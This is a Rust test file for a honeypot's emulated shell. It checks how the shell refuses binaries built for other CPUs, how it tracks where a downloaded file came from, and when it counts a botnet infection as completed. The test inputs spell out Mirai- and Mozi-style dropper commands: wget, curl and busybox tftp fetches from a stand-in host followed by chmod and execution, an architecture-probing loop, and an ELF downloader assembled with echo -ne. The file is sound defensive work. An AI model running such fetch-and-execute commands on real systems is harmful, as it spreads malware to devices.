//! Running a program built for another CPU: the architecture table, the ELF header path, the
//! provenance a fetched file keeps (through `cp`, `mv` and `cat > FILE`), and the refusal each
//! shell gives. The wording is checked against shells run on Ubuntu 22.04 (bash 5.1.16, dash
//! 0.5.11) and the AOSP marshmallow mksh source; see `arch::exec_format_refusal`.

use super::arch::{Arch, Image, elf_image, token_image};
use super::{CommandResult, EmitContext, FakeShell, OutputFd};
use crate::fakefs::FakeFs;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "telnet".to_string(),
        session_id: None,
    }
}

fn ubuntu() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

fn phone() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx())
}

fn stream(out: &CommandResult, fd: OutputFd) -> String {
    let bytes: Vec<u8> = out
        .output
        .iter()
        .filter(|segment| segment.fd == fd)
        .flat_map(|segment| segment.bytes.iter().copied())
        .collect();
    String::from_utf8(bytes).unwrap()
}

/// `(stdout, stderr, status)` of one line.
fn answer(sh: &mut FakeShell, line: &str) -> (String, String, u8) {
    let out = sh.handle_input(line).0;
    (
        stream(&out, OutputFd::Stdout),
        stream(&out, OutputFd::Stderr),
        out.status,
    )
}

/// A 24-byte ELF header with the given class (1 or 2), data encoding (1 little, 2 big) and
/// `e_machine`.
fn elf(class: u8, data: u8, machine: u16) -> Vec<u8> {
    let mut bytes = vec![0x7f, b'E', b'L', b'F', class, data, 1];
    bytes.resize(16, 0);
    bytes.extend_from_slice(&[2, 0]);
    let machine = if data == 1 {
        machine.to_le_bytes()
    } else {
        machine.to_be_bytes()
    };
    bytes.extend_from_slice(&machine);
    bytes.resize(24, 0);
    bytes
}

fn tok(name: &str) -> Option<(Arch, u8)> {
    token_image(name).map(|image| (image.arch, image.bits))
}

#[test]
fn mips_mipsel_and_mpsl_are_three_names_for_two_architectures() {
    assert_eq!(tok("mips"), Some((Arch::Mips, 32)));
    assert_eq!(tok("mipsel"), Some((Arch::Mipsel, 32)));
    assert_eq!(tok("mpsl"), Some((Arch::Mipsel, 32)));
    assert_eq!(tok("dlr.mpsl"), Some((Arch::Mipsel, 32)));
    assert_eq!(tok("Mirai.MIPS"), Some((Arch::Mips, 32)));
}

#[test]
fn arm_generations_are_32_bit_and_aarch64_is_not_arm() {
    for name in [
        "arm", "arm4", "arm5", "arm6", "arm7", "arm5n", "armv7l", "armv5tel",
    ] {
        assert_eq!(tok(name), Some((Arch::Arm, 32)), "{name}");
    }
    for name in ["aarch64", "arm64", "armv8"] {
        assert_eq!(tok(name), Some((Arch::Aarch64, 64)), "{name}");
    }
    assert_eq!(tok("armv8l"), Some((Arch::Arm, 32)));
    // No generation, or one the family never shipped, is not a token.
    assert_eq!(tok("arm9"), None);
    assert_eq!(tok("arm7verylong"), None);
}

#[test]
fn x86_and_x86_64_do_not_bleed_into_each_other() {
    assert_eq!(tok("x86"), Some((Arch::X86, 32)));
    assert_eq!(tok("i686"), Some((Arch::X86, 32)));
    assert_eq!(tok("x86_64"), Some((Arch::X86_64, 64)));
    assert_eq!(tok("bot.x86_64"), Some((Arch::X86_64, 64)));
    assert_eq!(tok("bot.x86-64"), Some((Arch::X86_64, 64)));
    assert_eq!(tok("amd64"), Some((Arch::X86_64, 64)));
}

#[test]
fn other_mirai_architectures() {
    assert_eq!(tok("ppc"), Some((Arch::PowerPc, 32)));
    assert_eq!(tok("sh4"), Some((Arch::Sh4, 32)));
    assert_eq!(tok("m68k"), Some((Arch::M68k, 32)));
    assert_eq!(tok("spc"), Some((Arch::Sparc, 32)));
}

#[test]
fn a_token_must_be_a_whole_name_part() {
    for name in [
        "alarm", "armada", "charm.sh", "pharmacy", "amips", "payload", "bins", "sh",
    ] {
        assert_eq!(tok(name), None, "{name}");
    }
    // A script that fetches one build is not that build.
    assert_eq!(tok("mips.sh"), None);
    assert_eq!(tok("x86_64.php"), None);
    // The last token in the name wins.
    assert_eq!(tok("arm7.x86"), Some((Arch::X86, 32)));
}

#[test]
fn elf_header_names_class_byte_order_and_machine() {
    let image = |bytes: &[u8]| elf_image(bytes).map(|i: Image| (i.arch, i.bits));
    assert_eq!(image(&elf(2, 1, 62)), Some((Arch::X86_64, 64)));
    assert_eq!(image(&elf(1, 1, 3)), Some((Arch::X86, 32)));
    assert_eq!(image(&elf(1, 1, 40)), Some((Arch::Arm, 32)));
    assert_eq!(image(&elf(2, 1, 183)), Some((Arch::Aarch64, 64)));
    assert_eq!(image(&elf(1, 2, 8)), Some((Arch::Mips, 32)));
    assert_eq!(image(&elf(1, 1, 8)), Some((Arch::Mipsel, 32)));
    assert_eq!(image(&elf(1, 2, 20)), Some((Arch::PowerPc, 32)));
    assert_eq!(image(&elf(1, 1, 243)), Some((Arch::Other, 32)));
    // Not an ELF, or too short or odd to say anything.
    assert_eq!(image(b"<html>"), None);
    assert_eq!(image(&elf(2, 1, 62)[..10]), None);
    assert_eq!(image(&elf(3, 1, 62)), None);
    assert_eq!(image(&elf(2, 9, 62)), None);
}

const BASH_REFUSAL: &str = "-bash: ./c: cannot execute binary file: Exec format error\n";

/// Fetch `name` from `url`, make the copy executable and run it.
fn fetch_and_run(sh: &mut FakeShell, url: &str) -> (String, String, u8) {
    answer(sh, &format!("wget -q {url} -O c; chmod +x c"));
    answer(sh, "./c")
}

#[test]
fn a_foreign_build_fetched_by_name_fails_like_bash() {
    let mut sh = ubuntu();
    for build in ["mips", "mpsl", "arm4", "arm7", "aarch64", "ppc", "sh4"] {
        let url = format!("http://198.51.100.9/{build}");
        assert_eq!(
            fetch_and_run(&mut sh, &url),
            (String::new(), BASH_REFUSAL.to_string(), 126),
            "{build}"
        );
    }
}

#[test]
fn the_native_builds_run_silently() {
    let mut sh = ubuntu();
    // 32-bit x86 runs under the distribution's IA-32 emulation.
    for build in ["x86_64", "amd64", "x86", "i686"] {
        let url = format!("http://198.51.100.9/{build}");
        assert_eq!(
            fetch_and_run(&mut sh, &url),
            (String::new(), String::new(), 0),
            "{build}"
        );
    }
}

#[test]
fn a_fetch_with_no_architecture_in_it_runs_as_before() {
    let mut sh = ubuntu();
    for url in [
        "http://198.51.100.9/payload",
        "http://198.51.100.9/",
        "http://mips.example.net/payload",
        "http://mips.example.net",
        "http://198.51.100.9/bins.sh",
    ] {
        assert_eq!(
            fetch_and_run(&mut sh, url),
            (String::new(), String::new(), 0),
            "{url}"
        );
    }
}

#[test]
fn the_url_decides_before_the_local_name_and_the_local_name_when_the_url_is_silent() {
    let mut sh = ubuntu();
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/mips -O x86_64; chmod +x x86_64",
    );
    assert_eq!(answer(&mut sh, "./x86_64").2, 126);
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/payload -O arm7; chmod +x arm7",
    );
    assert_eq!(answer(&mut sh, "./arm7").2, 126);
}

#[test]
fn every_fetch_applet_leaves_an_origin() {
    for line in [
        "wget -q http://198.51.100.9/mips -O c",
        "curl -s http://198.51.100.9/mips -o c",
        "busybox tftp -g -l c -r mips 198.51.100.9",
        "busybox wget -q http://198.51.100.9/mips -O c",
        "busybox ftpget 198.51.100.9 c mips",
    ] {
        let mut sh = ubuntu();
        answer(&mut sh, line);
        answer(&mut sh, "chmod +x c");
        assert_eq!(answer(&mut sh, "./c").2, 126, "{line}");
    }
}

#[test]
fn an_elf_is_judged_by_its_bytes_not_its_name() {
    let mut sh = ubuntu();
    sh.fs
        .write_file_mode("/root/a", &elf(1, 2, 8), 0o755)
        .unwrap();
    sh.fs
        .write_file_mode("/root/mips", &elf(2, 1, 62), 0o755)
        .unwrap();
    sh.fs
        .write_file_mode("/root/x86_64", &elf(1, 1, 40), 0o755)
        .unwrap();
    assert_eq!(answer(&mut sh, "./a").2, 126);
    assert_eq!(answer(&mut sh, "./mips"), (String::new(), String::new(), 0));
    assert_eq!(answer(&mut sh, "./x86_64").2, 126);
}

#[test]
fn an_elf_beats_the_name_a_fetch_gave_it() {
    let mut sh = ubuntu();
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c; chmod +x c");
    sh.fs
        .write_file_mode("/root/c", &elf(2, 1, 62), 0o755)
        .unwrap();
    assert_eq!(answer(&mut sh, "./c"), (String::new(), String::new(), 0));
}

#[test]
fn a_file_the_session_typed_has_no_architecture() {
    let mut sh = ubuntu();
    answer(&mut sh, "echo 'echo hi' > mips; chmod +x mips");
    assert_eq!(answer(&mut sh, "./mips"), (String::new(), String::new(), 0));
}

#[test]
fn overwriting_a_fetched_file_drops_where_it_came_from() {
    let mut sh = ubuntu();
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c; chmod +x c");
    answer(&mut sh, "echo hi > c");
    assert_eq!(answer(&mut sh, "./c"), (String::new(), String::new(), 0));
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c");
    answer(&mut sh, "wget -q http://198.51.100.9/x86_64 -O c");
    assert_eq!(answer(&mut sh, "./c"), (String::new(), String::new(), 0));
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/mips -O c; rm c; touch c; chmod +x c",
    );
    assert_eq!(answer(&mut sh, "./c"), (String::new(), String::new(), 0));
    // A copy of a file with no origin over it is a new file too.
    answer(
        &mut sh,
        "echo hi > s; wget -q http://198.51.100.9/mips -O c; cp s c; chmod +x c",
    );
    assert_eq!(answer(&mut sh, "./c"), (String::new(), String::new(), 0));
}

#[test]
fn copying_and_moving_keep_the_origin() {
    let mut sh = ubuntu();
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c; chmod +x c");
    answer(&mut sh, "cp c d; mv c e");
    assert_eq!(answer(&mut sh, "./d").2, 126);
    assert_eq!(answer(&mut sh, "./e").2, 126);
    assert_eq!(answer(&mut sh, "./c").2, 127);
}

#[test]
fn the_eclipse_busybox_copy_trick_is_judged_by_what_was_cat_over_the_copy() {
    let mut sh = ubuntu();
    for (build, status) in [("mips", 126), ("arm7", 126), ("x86_64", 0)] {
        answer(
            &mut sh,
            &format!("wget -q http://198.51.100.9/eclipse.{build} -O eclipse.{build}"),
        );
        answer(&mut sh, "cp /bin/busybox eclipsebox");
        answer(&mut sh, &format!("cat eclipse.{build} > eclipsebox"));
        assert_eq!(answer(&mut sh, "./eclipsebox").2, status, "{build}");
        answer(&mut sh, "rm eclipsebox");
    }
}

#[test]
fn cat_carries_an_origin_only_for_one_file_written_with_a_truncating_redirect() {
    let mut sh = ubuntu();
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/mips -O m; echo x > y; chmod +x m y",
    );
    answer(
        &mut sh,
        "cat m > a; cat m y > b; cat m >> c; cat m | cat > d",
    );
    answer(&mut sh, "chmod +x a b c d");
    assert_eq!(answer(&mut sh, "./a").2, 126);
    for stays_silent in ["./b", "./c", "./d"] {
        assert_eq!(answer(&mut sh, stays_silent).2, 0, "{stays_silent}");
    }
}

#[test]
fn a_loop_continues_past_the_foreign_builds_and_stops_at_the_native_one() {
    let mut sh = ubuntu();
    let (out, _, status) = answer(
        &mut sh,
        "for a in mips mpsl arm4 arm7 x86_64 x86; do wget -q http://198.51.100.9/$a -O .c; \
         chmod +x .c && ./.c && echo ran-$a && break; done",
    );
    assert_eq!((out.as_str(), status), ("ran-x86_64\n", 0));
}

#[test]
fn the_status_drives_and_and_or_chains() {
    let mut sh = ubuntu();
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O m; chmod +x m");
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/x86_64 -O n; chmod +x n",
    );
    assert_eq!(answer(&mut sh, "./m && echo yes").0, "");
    assert_eq!(answer(&mut sh, "./m || echo no").0, "no\n");
    assert_eq!(answer(&mut sh, "./n && echo yes").0, "yes\n");
    assert_eq!(answer(&mut sh, "./n || echo no").0, "");
    assert_eq!(answer(&mut sh, "./m; echo $?").0, "126\n");
}

#[test]
fn the_script_shells_word_it_their_own_way() {
    let mut sh = ubuntu();
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c; chmod +x c");
    assert_eq!(
        answer(&mut sh, "sh -c './c'"),
        (
            String::new(),
            "sh: 1: ./c: Exec format error\n".to_string(),
            126
        )
    );
    let mut sh = FakeShell::exec(FakeFs::new(), ctx());
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c; chmod +x c");
    assert_eq!(
        answer(&mut sh, "./c"),
        (
            String::new(),
            "bash: line 1: ./c: cannot execute binary file: Exec format error\n".to_string(),
            126
        )
    );
}

#[test]
fn the_phone_runs_arm_and_refuses_everything_else_in_mksh_words() {
    let mut sh = phone();
    answer(&mut sh, "cd /data/local/tmp");
    for build in ["arm", "arm5", "arm7", "armv7l"] {
        let url = format!("http://198.51.100.9/{build}");
        assert_eq!(
            fetch_and_run(&mut sh, &url),
            (String::new(), String::new(), 0),
            "{build}"
        );
    }
    for build in ["x86", "mips", "mpsl", "ppc"] {
        let url = format!("http://198.51.100.9/{build}");
        assert_eq!(
            fetch_and_run(&mut sh, &url),
            (
                String::new(),
                "sh: ./c: not executable: 32-bit ELF file\n".to_string(),
                1
            ),
            "{build}"
        );
    }
    for build in ["x86_64", "aarch64"] {
        let url = format!("http://198.51.100.9/{build}");
        assert_eq!(
            fetch_and_run(&mut sh, &url).1,
            "sh: ./c: not executable: 64-bit ELF file\n",
            "{build}"
        );
    }
}

#[test]
fn the_phone_reads_the_elf_class_from_the_header() {
    let mut sh = phone();
    sh.fs
        .write_file_mode("/data/local/tmp/a", &elf(2, 1, 62), 0o755)
        .unwrap();
    sh.fs
        .write_file_mode("/data/local/tmp/b", &elf(1, 1, 40), 0o755)
        .unwrap();
    answer(&mut sh, "cd /data/local/tmp");
    assert_eq!(
        answer(&mut sh, "./a"),
        (
            String::new(),
            "sh: ./a: not executable: 64-bit ELF file\n".to_string(),
            1
        )
    );
    assert_eq!(answer(&mut sh, "./b"), (String::new(), String::new(), 0));
}

#[test]
fn a_session_that_fetches_many_files_keeps_a_bounded_number_of_origins() {
    let mut sh = ubuntu();
    for n in 0..80 {
        answer(
            &mut sh,
            &format!("wget -q http://198.51.100.9/mips -O f{n}"),
        );
    }
    assert_eq!(sh.origins.len(), 64);
    // Fetching over a tracked file drops its old origin first, so the new one always fits.
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/x86_64 -O f0; chmod +x f0",
    );
    assert_eq!(answer(&mut sh, "./f0"), (String::new(), String::new(), 0));
}

#[test]
fn only_gnu_chmod_names_a_missing_operand() {
    let mut sh = ubuntu();
    assert_eq!(
        answer(&mut sh, "chmod +x nosuch"),
        (
            String::new(),
            "chmod: cannot access 'nosuch': No such file or directory\n".to_string(),
            1
        )
    );
    // The busybox applet's and the phone's wording are not recorded, so they stay silent.
    assert_eq!(
        answer(&mut sh, "busybox chmod +x nosuch"),
        (String::new(), String::new(), 0)
    );
    let mut sh = phone();
    answer(&mut sh, "cd /data/local/tmp");
    assert_eq!(
        answer(&mut sh, "chmod +x nosuch"),
        (String::new(), String::new(), 0)
    );
}

#[test]
fn a_directory_search_path_or_missing_file_is_unchanged() {
    let mut sh = ubuntu();
    assert_eq!(answer(&mut sh, "./nosuch").2, 127);
    answer(&mut sh, "wget -q http://198.51.100.9/mips -O c");
    // Not executable: the permission error comes before any architecture check.
    assert_eq!(answer(&mut sh, "./c").2, 126);
    assert_eq!(answer(&mut sh, "./c").1, "-bash: ./c: Permission denied\n");
}

/// An x86-64 ELF header through `e_machine`, as `echo -ne` takes it.
const ELF_HEAD: &str = r"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00";

#[test]
fn a_fetched_file_that_runs_natively_completes_the_infection() {
    let mut sh = ubuntu();
    assert!(!sh.infection_completed());
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod +x c",
    );
    assert!(
        !sh.infection_completed(),
        "fetched and made executable only"
    );
    assert_eq!(answer(&mut sh, "./c").2, 0);
    assert!(sh.infection_completed());
}

#[test]
fn a_build_for_another_cpu_does_not_complete_it_but_the_native_one_in_the_loop_does() {
    let mut sh = ubuntu();
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/bins/mips -O c; chmod +x c",
    );
    assert_eq!(answer(&mut sh, "./c").2, 126);
    assert!(!sh.infection_completed(), "Exec format error");
    answer(
        &mut sh,
        "for a in mips arm7 x86_64; do wget -q http://198.51.100.9/bins/$a -O .c; \
         chmod +x .c; ./.c && break; done",
    );
    assert!(
        sh.infection_completed(),
        "the loop reached the native build"
    );
}

#[test]
fn a_download_that_is_never_run_completes_nothing() {
    let mut sh = ubuntu();
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod 777 c; curl -s http://198.51.100.9/y -o d",
    );
    assert!(!sh.infection_completed());
}

#[test]
fn a_fetch_that_was_refused_or_overwritten_completes_nothing() {
    let mut sh = ubuntu();
    // Not executable: the shell refuses before anything runs.
    answer(&mut sh, "wget -q http://198.51.100.9/bins/x86_64 -O c");
    assert_eq!(answer(&mut sh, "./c").2, 126);
    // A typed script written over the fetched file has no origin left.
    answer(&mut sh, "echo hi > c; chmod +x c");
    assert_eq!(answer(&mut sh, "./c").2, 0);
    assert!(!sh.infection_completed());
}

#[test]
fn a_script_typed_in_one_echo_is_a_probe_not_an_infection() {
    let mut sh = ubuntu();
    answer(&mut sh, "echo 'echo hi' > .t; chmod +x .t");
    assert_eq!(answer(&mut sh, "./.t").2, 0);
    assert!(!sh.infection_completed());
}

#[test]
fn an_assembled_program_that_runs_natively_completes_it_with_one_chunk_or_many() {
    let mut chunked = ubuntu();
    answer(&mut chunked, &format!("echo -ne '{ELF_HEAD}' > .i"));
    answer(&mut chunked, "echo -ne 'abcdef' >> .i; chmod 777 .i");
    assert!(!chunked.infection_completed());
    assert_eq!(answer(&mut chunked, "./.i").2, 0);
    assert!(chunked.infection_completed());

    let mut single = ubuntu();
    answer(
        &mut single,
        &format!("echo -ne '{ELF_HEAD}abc' > .i; chmod 777 .i"),
    );
    assert_eq!(answer(&mut single, "./.i").2, 0);
    assert!(single.infection_completed());

    let mut two_writes = ubuntu();
    answer(
        &mut two_writes,
        "echo 'one' > .s; echo 'two' >> .s; chmod 777 .s",
    );
    assert_eq!(answer(&mut two_writes, "./.s").2, 0);
    assert!(
        two_writes.infection_completed(),
        "built by more than one write"
    );
}

#[test]
fn an_assembled_downloader_that_cannot_reach_its_server_has_not_infected_anything() {
    let mut sh = ubuntu();
    let mut image = String::from(ELF_HEAD);
    image.push_str(r"GET /Mozi.6 HTTP/1.0\r\n\r\n");
    answer(&mut sh, &format!("echo -ne '{image}' > .i; chmod 777 .i"));
    assert_eq!(answer(&mut sh, "./.i 198 51 100 23 3912").2, 1);
    assert!(!sh.infection_completed());
}

#[test]
fn a_line_that_is_undone_for_its_input_does_not_leave_the_infection_behind() {
    let mut sh = ubuntu();
    answer(
        &mut sh,
        "wget -q http://198.51.100.9/bins/x86_64 -O c; chmod +x c",
    );
    // `./c; cat > f` waits for terminal input: the run is undone and redone on the input.
    let (step, _) = sh.start_line("./c; cat > f");
    assert!(matches!(step, super::LineStep::AwaitingInput));
    assert!(
        !sh.infection_completed(),
        "undone with the rest of the line"
    );
}
